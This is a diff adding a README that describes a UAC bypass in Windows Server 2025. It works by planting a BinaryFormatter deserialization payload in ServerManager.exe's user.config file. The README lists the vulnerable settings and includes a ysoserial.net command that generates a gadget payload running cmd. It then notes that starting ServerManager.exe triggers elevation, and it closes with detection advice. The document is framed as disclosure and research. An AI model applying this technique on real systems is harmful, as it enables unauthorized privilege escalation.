@@ -1,2 +1,63 @@
-# WindowsServerDeserializationUACBypass
-Windows ServerUAC bypass using ServerManager.exe
+# Windows Sever Deserialization UAC bypass
+
+> [!IMPORTANT]
+> I notified Microsoft about this method and received a response that UAC is not considered a security boundary or security vulnerability for servicing. The POC can only be used for security testing and research on systems that you own or that you are explicitly authorized to evaluate.
+
+## Introduction
+
+In the `user.config` file (`C:\Users\test\AppData\Local\Microsoft_Corporation\ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj\10.0.0.0\user.config`) there are parameters that will be deserialized by the program `ServerManager.exe` at startup. The increase is due to the set parameter `<autoElevate>true</autoElevate>` in the program manifest `ServerManager.exe`.
+
+## Description
+
+**Test system:** Microsoft Windows Server 2025 Standard Evaluation 10.0.26100 Build 26100
+
+**SystemManager version:** 10.0.26100.1591 (WinBuild.160101.0800)
+
+In the `Microsoft.Windows.ServerManager.Common.dll` -> `Microsoft.Windows.ServerManager.Common.Properties` -> `Settings` the class is responsible for working with the parameters from the configuration file.
+
+Parameters from classes with attributes set to `[SettingsSerializeAs(SettingsSerializeAs.Binary)]` can be used to bypass UAC:
+- PerfCounterDashboardSettings
+- EventsDashboardSetting
+- ServersDashboardSettings
+- BPADashboardSettings
+- ServicesDashboardSettings
+- EventsQuerySettings
+
+
+Example of a parameter with serialized data from a configuration file:
+
+```xml
+...
+<setting name="PerfCounterDashboardSettings" serializeAs="Binary">
+<value>AAEAAAD/////AQAAAAAAAAAMAgAAAGpNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbiwgVmVyc2lvbj0xMC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABITWljcm9zb2Z0LldpbmRvd3MuU2VydmVyTWFuYWdlci5Db21tb24uRGF0YS5QZXJmQ291bnRlckRhc2hib2FyZFNldHRpbmdzAgAAADZEYXNoYm9hcmRTZXR0aW5nc2AxKzxSb2xlQmFzZWRTZXR0aW5ncz5rX19CYWNraW5nRmllbGQ9RGFzaGJvYXJkU2V0dGluZ3NgMSs8U2VydmVyR3JvdXBCYXNlZFNldHRpbmdzPmtfX0JhY2tpbmdGaWVsZAMDxAJTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5EaWN0aW9uYXJ5YDJbW1N5c3RlbS5JbnQzMiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbTWljcm9zb2Z0LldpbmRvd3MuU2VydmVyTWFuYWdlci5Db21tb24uRGF0YS5QZXJmQ291bnRlckRhc2hib2FyZFNldHRpbmdDb2xsZWN0aW9uLCBNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbiwgVmVyc2lvbj0xMC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1XV3EAlN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLkludDMyLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbi5EYXRhLlBlcmZDb3VudGVyRGFzaGJvYXJkU2V0dGluZ0NvbGxlY3Rpb24sIE1pY3Jvc29mdC5XaW5kb3dzLlNlcnZlck1hbmFnZXIuQ29tbW9uLCBWZXJzaW9uPTEwLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdXQIAAAAJAwAAAAkEAAAABAMAAADEAlN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLkludDMyLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbi5EYXRhLlBlcmZDb3VudGVyRGFzaGJvYXJkU2V0dGluZ0NvbGxlY3Rpb24sIE1pY3Jvc29mdC5XaW5kb3dzLlNlcnZlck1hbmFnZXIuQ29tbW9uLCBWZXJzaW9uPTEwLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdXQMAAAAHVmVyc2lvbghDb21wYXJlcghIYXNoU2l6ZQADAAiRAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkdlbmVyaWNFcXVhbGl0eUNvbXBhcmVyYDFbW1N5c3RlbS5JbnQzMiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAAAAAAkFAAAAAAAAAAEEAAAAAwAAAAAAAAAJBQAAAAAAAAAEBQAAAJEBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLkludDMyLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQAAAAAL</value>
+</setting>
+...
+```
+
+A parameter from `Microsoft.Windows.ServerManager.Properties.UISettings` can also be used to bypass UAC. Below is a part of the file with the parameter `A4619FC0-A212-4528-B1E3-B5579123A072` which stores the serialized data. Most likely, this parameter is not universal and depends on the installed system.
+
+```xml
+...
+<Microsoft.Windows.ServerManager.Properties.UISettings>
+   ...
+   <setting
+          name="A4619FC0-A212-4528-B1E3-B5579123A072"
+          serializeAs="Binary">
+<value>AAEAAAD/////AQAAAAAAAAAEAQAAAI8CU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuRGljdGlvbmFyeWAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtNaWNyb3NvZnQuTWFuYWdlbWVudC5VSS5JUGVyc2lzdGVuY2VPYmplY3QsIE1pY3Jvc29mdC5NYW5hZ2VtZW50LlVJLCBWZXJzaW9uPTEwLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdXQMAAAAHVmVyc2lvbghDb21wYXJlcghIYXNoU2l6ZQADAAiSAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkdlbmVyaWNFcXVhbGl0eUNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAAAAAAJAgAAAAAAAAAEAgAAAJIBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0AAAAACw==</value>
+   </setting>
+</Microsoft.Windows.ServerManager.Properties.UISettings>
+...
+```
+
+The [ysoserial.net](https://github.com/pwntester/ysoserial.net) tool is used to generate the load.
+
+```bash
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd"
+```
+
+In order to speed up the execution of the load, it is enough to simply run `ServerManager.exe`.
+
+## Detect
+
+* monitoring access to the `user.config` file
+* monitoring of child processes `ServerManager.exe`
